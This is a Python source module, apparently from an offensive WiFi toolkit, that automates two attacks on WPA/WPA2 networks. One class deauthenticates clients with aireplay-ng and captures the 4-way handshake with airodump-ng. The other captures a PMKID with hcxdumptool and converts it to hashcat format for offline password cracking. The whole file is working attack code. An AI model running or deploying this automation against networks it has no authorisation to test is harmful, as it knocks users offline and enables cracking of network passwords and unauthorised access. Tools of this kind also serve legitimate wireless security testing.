"""
WPA/WPA2 WiFi attacks: Handshake capture and PMKID.
"""

import asyncio
import time
from datetime import datetime
from pathlib import Path
from typing import Callable, Optional

import structlog

from urban_hs.modules.wifi.attacks.base import AttackResult, AttackStatus, BaseAttack

logger = structlog.get_logger(__name__)


class HandshakeAttack(BaseAttack):
    """
    WPA/WPA2 Handshake Capture Attack.

    Uses aireplay-ng to deauthenticate clients and airodump-ng to capture
    the 4-way handshake when they reconnect.
    """

    def __init__(
        self,
        interface: str,
        output_dir: Optional[str] = None,
        attack_timeout: int = 60,
        deauth_count: int = 10,
    ):
        if output_dir is None:
            from urban_hs.core.config import get_config
            output_dir = str(Path(get_config().storage.resolve_wifi_attacks_dir()) / "handshakes")
        super().__init__(interface, output_dir, attack_timeout)
        self.deauth_count = deauth_count

    async def execute(
        self,
        target_bssid: str,
        target_essid: Optional[str] = None,
        channel: int = 1,
        callback: Optional[Callable[[str], None]] = None,
    ) -> AttackResult:
        result = AttackResult(
            attack_type="handshake",
            target_bssid=target_bssid,
            target_essid=target_essid,
            status=AttackStatus.RUNNING,
            started_at=datetime.utcnow(),
        )

        self._running = True
        self._cancelled = False

        safe_bssid = target_bssid.replace(":", "_")
        timestamp = int(time.time())
        base_name = f"hs_{safe_bssid}_{timestamp}"
        cap_file = self.output_dir / f"{base_name}.cap"

        result.output_files = [str(cap_file)]

        try:
            self._log("Starting airodump-ng capture", bssid=target_bssid, channel=channel)
            self._notify_callback(callback, f"Starting capture on channel {channel}")

            airodump_proc = await self._start_airodump(
                bssid=target_bssid,
                channel=channel,
                output_prefix=str(self.output_dir / base_name),
            )

            await asyncio.sleep(2)

            self._log("Sending deauth packets", count=self.deauth_count)
            self._notify_callback(callback, f"Sending {self.deauth_count} deauth packets")

            proc = await asyncio.create_subprocess_exec(
                "aireplay-ng",
                "-0", str(self.deauth_count),
                "-a", target_bssid,
                self.interface,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            self._log("Waiting for handshake", timeout=self.attack_timeout)
            self._notify_callback(callback, "Waiting for handshake...")

            try:
                await asyncio.wait_for(airodump_proc.wait(), timeout=self.attack_timeout)
            except asyncio.TimeoutError:
                self._log("Timeout reached, killing airodump")
                airodump_proc.terminate()
                try:
                    await asyncio.wait_for(airodump_proc.wait(), timeout=5)
                except asyncio.TimeoutError:
                    airodump_proc.kill()
                    await airodump_proc.wait()

            result.finished_at = datetime.utcnow()

            if cap_file.exists() and cap_file.stat().st_size > 0:
                if await self._verify_handshake(str(cap_file)):
                    result.status = AttackStatus.SUCCESS
                    result.handshake_path = str(cap_file)
                    self._notify_callback(callback, "Handshake captured successfully!")
                else:
                    result.status = AttackStatus.FAILED
                    result.error_message = "No valid handshake in capture"
            else:
                result.status = AttackStatus.FAILED
                result.error_message = "No capture data"

        except Exception as e:
            result.status = AttackStatus.FAILED
            result.error_message = str(e)
        finally:
            self._running = False

        result.finished_at = datetime.utcnow()
        return result

    async def _verify_handshake(self, cap_file: str) -> bool:
        """Verify if capture file contains valid handshake."""
        try:
            proc = await asyncio.create_subprocess_exec(
                "aircrack-ng", cap_file,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            output = stdout.decode()
            return "handshake" in output.lower() and "1" in output
        except Exception:
            return False


class PMKIDAttack(BaseAttack):
    """
    PMKID Attack (Client-less WPA2/WPA3).

    Uses hcxdumptool to capture PMKID without requiring a connected client.
    Then converts to hashcat 22000 format using hcxpcapngtool.
    """

    def __init__(
        self,
        interface: str,
        output_dir: Optional[str] = None,
        attack_timeout: int = 60,
    ):
        if output_dir is None:
            from urban_hs.core.config import get_config
            output_dir = str(Path(get_config().storage.resolve_wifi_attacks_dir()) / "pmkid")
        super().__init__(interface, output_dir, attack_timeout)

    async def execute(
        self,
        target_bssid: str,
        target_essid: Optional[str] = None,
        channel: int = 1,
        callback: Optional[Callable[[str], None]] = None,
    ) -> AttackResult:
        result = AttackResult(
            attack_type="pmkid",
            target_bssid=target_bssid,
            target_essid=target_essid,
            status=AttackStatus.RUNNING,
            started_at=datetime.utcnow(),
        )

        self._running = True

        timestamp = int(time.time())
        base_name = f"pmkid_{target_bssid.replace(':', '_')}_{timestamp}"
        pcap_file = self.output_dir / f"{base_name}.pcapng"
        hash_file = self.output_dir / f"{base_name}.22000"

        result.output_files = [str(pcap_file)]

        try:
            self._log("Starting PMKID capture", bssid=target_bssid, channel=channel)
            self._notify_callback(callback, f"Starting PMKID capture on channel {channel}")

            proc = await self._run_hcxdumptool(
                bssid=target_bssid,
                channel=channel,
                output_file=pcap_file,
                timeout=self.attack_timeout,
            )

            self._log("hcxdumptool process started", pid=proc.pid)
            self._notify_callback(callback, f"PMKID capture started (PID: {proc.pid})")

            try:
                await asyncio.wait_for(proc.wait(), timeout=self.attack_timeout)
            except asyncio.TimeoutError:
                self._log("hcxdumptool timeout, killing process")
                proc.kill()
                await proc.wait()
                self._log("hcxdumptool timeout, checking capture file anyway")

            self._log("hcxdumptool process finished", returncode=proc.returncode)

            if proc.stderr:
                stderr_data = await proc.stderr.read()
                if stderr_data:
                    self._log("hcxdumptool stderr", stderr=stderr_data.decode()[:500])

            if pcap_file.exists() and pcap_file.stat().st_size > 0:
                self._log("Converting PCAP to hashcat 22000 format")
                hash_result = await self._convert_to_hashcat(pcap_file, hash_file)

                if hash_result:
                    result.status = AttackStatus.SUCCESS
                    result.pmkid_path = str(hash_file)
                    result.output_files.append(str(hash_file))
                    self._notify_callback(callback, "PMKID captured and converted to hashcat format!")
                else:
                    result.status = AttackStatus.FAILED
                    result.error_message = "No PMKID found in capture"
            else:
                result.status = AttackStatus.FAILED
                result.error_message = "No capture data"

        except Exception as e:
            result.status = AttackStatus.FAILED
            result.error_message = str(e)
        finally:
            self._running = False

        result.finished_at = datetime.utcnow()
        return result

    async def _convert_to_hashcat(self, pcap_file: Path, hash_file: Path) -> bool:
        """Convert PCAP to hashcat 22000 format using hcxpcapngtool."""
        try:
            cmd = ["hcxpcapngtool", "-o", str(hash_file), str(pcap_file)]
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            if proc.returncode == 0 and hash_file.exists():
                return True
            return False
        except Exception:
            return False
